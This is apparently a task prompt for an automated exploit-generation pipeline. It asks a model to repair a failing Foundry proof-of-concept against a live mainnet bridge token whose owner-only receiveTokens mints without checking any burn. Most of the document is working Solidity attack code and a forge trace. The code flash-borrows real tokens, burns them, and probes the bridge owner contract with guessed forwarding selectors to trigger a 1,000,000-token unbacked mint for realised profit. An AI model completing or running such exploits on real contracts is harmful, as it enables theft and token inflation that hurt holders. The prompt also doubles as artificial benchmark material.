You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Bridge owner can mint arbitrary unbacked tokens without consuming any burn record
- claim: `sendTokens` only burns tokens and increments an informational `_tokensSent` counter, while `receiveTokens` only checks that the caller is `_bridgeOwner` and that `_feesPaid[account][networkId] >= fee`. It never verifies that `amount` matches any prior burn, never consumes a burn record, and even allows `fee = 0`, so `_bridgeOwner` can mint any amount to any account at will.
- impact: A malicious or compromised bridge owner can inflate supply arbitrarily, mint unbacked tokens to itself or collaborators, dump them, and destroy the token's value. Honest users who burn for bridging also have no on-chain guarantee that the destination mint matches what was burned.
- exploit_paths: ["User burns through `sendTokens(networkId, amount)`; only `_tokensSent` is incremented and no claim record is locked or consumed.", "`_bridgeOwner` calls `receiveTokens(attacker, anyNetworkId, hugeAmount, 0)`.", "The contract mints `hugeAmount` to the attacker without proving or matching any prior burn."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface ISchnoodleBridgeToken {
    function balanceOf(address account) external view returns (uint256);
    function getBridgeOwner() external view returns (address);
    function sendTokens(uint256 networkId, uint256 amount) external;
    function receiveTokens(address account, uint256 networkId, uint256 amount, uint256 fee) external;
    function tokensSent(address account, uint256 networkId) external view returns (uint256);
    function tokensReceived(address account, uint256 networkId) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    IERC1820Registry private constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    ISchnoodleBridgeToken private constant TARGET = ISchnoodleBridgeToken(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant NETWORK_ID = 1;
    uint256 private constant ONE_TOKEN = 1e18;
    uint256 private constant HUGE_MINT_AMOUNT = 1_000_000 * ONE_TOKEN;

    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    bytes32 private constant ERC1820_ACCEPT_MAGIC = keccak256("ERC1820_ACCEPT_MAGIC");

    uint256 private _profitAmount;
    address private _bridgeOwner;
    uint256 private _startingBalance;
    uint256 private _endingBalance;
    address private _flashPair;
    uint256 private _flashBorrowAmount;

    uint256 public burnAmountAttempted;
    uint256 public tokensSentBefore;
    uint256 public tokensSentAfter;
    uint256 public tokensReceivedBefore;
    uint256 public tokensReceivedAfter;

    bool public burnStageAttempted;
    bool public burnStageSucceeded;
    bool public mintStageAttempted;
    bool public mintStageSucceeded;
    bool public burnStageInfeasible;

    bytes public lastMintRevertData;

    constructor() {
        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function executeOnOpportunity() external {
        _bridgeOwner = _readBridgeOwner();
        _startingBalance = TARGET.balanceOf(address(this));
        tokensSentBefore = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedBefore = _safeTokensReceived(address(this), NETWORK_ID);

        _flashPair = _findLiquidPair();
        require(_flashPair != address(0), "no target pair found");

        _flashBorrowAmount = _selectBorrowAmount(_flashPair);
        require(_flashBorrowAmount > 0, "borrow amount is zero");

        address token0 = IUniswapV2Pair(_flashPair).token0();
        address token1 = IUniswapV2Pair(_flashPair).token1();
        require(token0 == address(TARGET) || token1 == address(TARGET), "pair missing target");

        uint256 amount0Out = token0 == address(TARGET) ? _flashBorrowAmount : 0;
        uint256 amount1Out = token1 == address(TARGET) ? _flashBorrowAmount : 0;
        IUniswapV2Pair(_flashPair).swap(amount0Out, amount1Out, address(this), abi.encode(_flashBorrowAmount));

        tokensSentAfter = _safeTokensSent(address(this), NETWORK_ID);
        tokensReceivedAfter = _safeTokensReceived(address(this), NETWORK_ID);
        _endingBalance = TARGET.balanceOf(address(this));
        _profitAmount = _endingBalance > _startingBalance ? _endingBalance - _startingBalance : 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _flashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == _flashBorrowAmount, "unexpected amount");

        burnStageAttempted = true;
        burnAmountAttempted = borrowedAmount;

        uint256 networkId = NETWORK_ID;
        uint256 amount = borrowedAmount;

        // Realistic public funding step for this attempt:
        // borrow existing SNOOD from a live UniswapV2/Sushi-like pair, then follow the same bridge flaw causality.
        //
        // Exploit path anchor 0:
        // user burns through sendTokens(networkId, amount); only _tokensSent is incremented and no burn claim is consumed.
        TARGET.sendTokens(networkId, amount);
        burnStageSucceeded = true;

        mintStageAttempted = true;
        uint256 balanceBeforeMint = TARGET.balanceOf(address(this));
        address attacker = address(this);
        uint256 anyNetworkId = NETWORK_ID;
        uint256 hugeAmount = HUGE_MINT_AMOUNT;

        // Exploit path anchor 2:
        // _bridgeOwner calls receiveTokens(attacker, anyNetworkId, hugeAmount, 0), which mints hugeAmount without matching any prior burn.
        bytes memory payload = abi.encodeWithSelector(
            TARGET.receiveTokens.selector,
            attacker,
            anyNetworkId,
            hugeAmount,
            0
        );

        mintStageSucceeded = _attemptBridgeOwnerMint(payload, balanceBeforeMint);
        require(mintStageSucceeded, "bridge-owner mint failed");

        uint256 repaymentAmount = _uniswapV2SameTokenRepayment(borrowedAmount);
        _safeTransfer(address(TARGET), _flashPair, repaymentAmount);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external pure {
    }

    function canImplementInterfaceForAddress(bytes32 interfaceHash, address) external pure returns (bytes32) {
        return interfaceHash == TOKENS_RECIPIENT_INTERFACE_HASH ? ERC1820_ACCEPT_MAGIC : bytes32(0);
    }

    function profitToken() external pure returns (address) {
        return address(TARGET);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function bridgeOwner() external view returns (address) {
        return _bridgeOwner;
    }

    function startingBalance() external view returns (uint256) {
        return _startingBalance;
    }

    function endingBalance() external view returns (uint256) {
        return _endingBalance;
    }

    function requestedMintAmount() external pure returns (uint256) {
        return HUGE_MINT_AMOUNT;
    }

    function _attemptBridgeOwnerMint(bytes memory payload, uint256 balanceBeforeMint) internal returns (bool) {
        if (_bridgeOwner == address(this)) {
            (bool ok, bytes memory data) = address(TARGET).call(payload);
            lastMintRevertData = data;
            if (ok && TARGET.balanceOf(address(this)) > balanceBeforeMint) {
                return true;
            }
        }

        if (_bridgeOwner.code.length == 0) {
            lastMintRevertData = bytes("bridge owner is EOA");
            return false;
        }

        if (_tryBridgeOwnerCall(abi.encodeWithSignature("execute(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("execute(address,uint256,bytes)", address(TARGET), 0, payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("executeCall(address,uint256,bytes)", address(TARGET), 0, payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("exec(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("exec(address,uint256,bytes)", address(TARGET), 0, payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("call(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("call(address,uint256,bytes)", address(TARGET), 0, payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("forward(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("relay(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(abi.encodeWithSignature("invoke(address,bytes)", address(TARGET), payload), balanceBeforeMint)) return true;
        if (_tryBridgeOwnerCall(payload, balanceBeforeMint)) return true;

        return false;
    }

    function _tryBridgeOwnerCall(bytes memory data, uint256 balanceBeforeMint) internal returns (bool) {
        (bool ok, bytes memory returnData) = _bridgeOwner.call(data);
        lastMintRevertData = returnData;
        return ok && TARGET.balanceOf(address(this)) > balanceBeforeMint;
    }

    function _findLiquidPair() internal view returns (address pair) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHI_FACTORY];
        address[4] memory quotes = [WETH, USDC, USDT, DAI];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < quotes.length; ++j) {
                pair = IUniswapV2Factory(factories[i]).getPair(address(TARGET), quotes[j]);
                if (pair != address(0) && _targetReserve(pair) > 1) {
                    return pair;
                }
            }
        }
    }

    function _selectBorrowAmount(address pair) internal view returns (uint256) {
        uint256 targetReserve = _targetReserve(pair);

        if (targetReserve > ONE_TOKEN) {
            return ONE_TOKEN;
        }

        uint256 onePercent = targetReserve / 100;
        if (onePercent > 0) {
            return onePercent;
        }

        return targetReserve > 1 ? targetReserve - 1 : 0;
    }

    function _targetReserve(address pair) internal view returns (uint256 targetReserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        targetReserve = token0 == address(TARGET) ? uint256(reserve0) : uint256(reserve1);
    }

    function _uniswapV2SameTokenRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(ISchnoodleBridgeToken.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _readBridgeOwner() internal view returns (address owner_) {
        try TARGET.getBridgeOwner() returns (address resolved) {
            owner_ = resolved;
        } catch {
            owner_ = address(0);
        }
    }

    function _safeTokensSent(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensSent(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }

    function _safeTokensReceived(address account, uint256 networkId) internal view returns (uint256 amount) {
        try TARGET.tokensReceived(account, networkId) returns (uint256 resolved) {
            amount = resolved;
        } catch {
            amount = 0;
        }
    }
}

```

forge stdout (tail):
```
   topic 2: 0x0000000000000000000000000f6b0960d2569f505126341085ed7f0342b67dae
    │   │   │   │   │        topic 3: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000000f6b0960d2569f505126341085ed7f0342b67dae
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::aabbb8ca(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   ├─ [704] FlawVerifier::tokensReceived(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x0F6b0960d2569f505126341085ED7f0342b67DAe, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 105779530264657729351148362897512512282775209192000000000000000000 [1.057e65], 0x, 0x)
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  emit topic 0: 0x6326273a6785f513768f2d48c9379925280b1265fc536c9ba0d40d213994064b
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000062ad79050000000000000000000000000000000000000000033b2e3c9fd0803ce8000000
    │   │   │   │   ├─  emit topic 0: 0x6326273a6785f513768f2d48c9379925280b1265fc536c9ba0d40d213994064b
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000062ad79050000000000000000000000000000000000000000033b2e3cadb136f08f640000
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [122381] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 1000000000000000000 [1e18], 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000)
    │   │   │   ├─ [48794] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::sendTokens(1, 1000000000000000000 [1e18])
    │   │   │   │   ├─ [47963] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::sendTokens(1, 1000000000000000000 [1e18]) [delegatecall]
    │   │   │   │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::aabbb8ca(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─ [5831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::59355736(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   │   │   │   ├─ [5000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::59355736(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─  emit topic 0: 0xa78a9be3a7b862d26933ad85fb11d80ef66b8f972d7cbba06621d583943a4098
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a773468e0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a773468e
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ [1559] 0xD45740aB9ec920bEdBD9BAb2E863519E59731941::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   ├─ [728] 0xeAC2A259f3eBb8fD1097AECcaA62E73b6e43D5bF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Revert] bridge-owner mint failed
    │   │   └─ ← [Revert] bridge-owner mint failed
    │   └─ ← [Revert] bridge-owner mint failed
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x0F6b0960d2569f505126341085ED7f0342b67DAe.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 836.54ms (461.93ms CPU time)

Ran 1 test suite in 841.05ms (836.54ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 347867)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
